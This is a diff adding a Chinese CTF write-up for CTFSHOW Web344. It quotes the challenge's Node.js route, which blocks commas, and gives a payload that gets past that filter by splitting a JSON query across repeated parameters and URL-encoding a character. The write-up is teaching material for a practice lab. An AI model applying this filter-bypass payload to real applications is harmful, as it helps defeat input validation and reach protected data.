@@ -130,3 +130,33 @@ module.exports = router;
 ![CTFSHOW-WEB339](./pic/CTFSHOW-WEB339.png)
 
 之后我们前往`url/api`界面发起post包即可获得flag
+
+
+
+# Web344
+
+代码审计，需要query当中的name，password与isVIP符合条件，本来传入`query={"name":"admin","password":"ctfshow","isVIP":true}`即可但是这道题过滤了2c也就过滤了`%2c(逗号)`(req.url获取的值是url编码后的所以逗号会变成%2c)
+
+```
+router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag = 'flag_here';
+  if(req.url.match(/8c|2c|\,/ig)){
+  	res.end('where is flag :)');
+  }
+  var query = JSON.parse(req.query.query);
+  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
+  	res.end(flag);
+  }else{
+  	res.end('where is flag. :)');
+  }
+});
+```
+
+Nodejs的一个小特性吧，这样他会把三个部分拼接在一起
+
+```
+由于"的url编码为%22与c又合成了2c所以c需要编码
+query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
+```
+
